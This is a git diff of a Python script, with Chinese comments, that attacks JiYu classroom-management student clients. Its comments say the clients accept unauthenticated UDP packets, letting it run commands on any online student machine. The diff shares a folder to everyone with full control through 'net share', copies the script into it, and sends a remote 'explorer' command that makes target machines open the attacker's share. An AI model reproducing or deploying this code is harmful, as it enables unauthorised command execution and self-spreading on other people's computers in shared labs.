@@ -258,6 +258,7 @@ def run_from_cmd():
 
 
 def chat_main():
+    global NoExit
     NoExit = True
     print("\n\n ~~欢迎使用 *小小私聊*！~~\n\n")
     print("原理：因为极域的学生端没有对接收到的udp包做身份验证，导致了我们可以构造特定的数据包让学生端来执行，从而实现操作机房内上线的任意学生端机器。")
@@ -294,6 +295,7 @@ def chat_main():
                     print("不可发送空白消息！")
                 else:
                     send_msg(prefix + msg)
+                    sleep(1)
         else:
             print("似乎没有找到你要的同学...")
             print("再输入一次？")
@@ -369,21 +371,22 @@ def get_IP_prefix(ip_address):
 def transfer_program():
     current_path = os.path.realpath(__file__)
     file_name = os.path.basename(current_path)
-    share_folder = r"D:\小小私聊"
-    local_cmd = "net share Docs={} /grant:everyone,FULL",format=share_folder
+    share_folder = r"E:\小小私聊"
+    local_cmd = "net share 点我聊天=E:\\小小私聊 /grant:everyone,FULL"
+    remote_cmd = "explorer \\\\ " +getIP()
     try:
         os.mkdir(share_folder)
         shutil.copy(current_path, share_folder)
-        os.popen(local_cmd)
     except:
-        print("[ - ] error in transfer program")
         pass
-    remote_cmd = "explorer \\\\ " +getIP()+"\\小小私聊\\"+file_name
+    process = os.popen(local_cmd)
     send_cmd(remote_cmd)
+    
+    
 
 
 version = 20241110
-debug = False
+debug = True
 NoExit = False
 
 if __name__ == "__main__":  # 程序最先执行此处！当用户双击直接执行本脚本时...
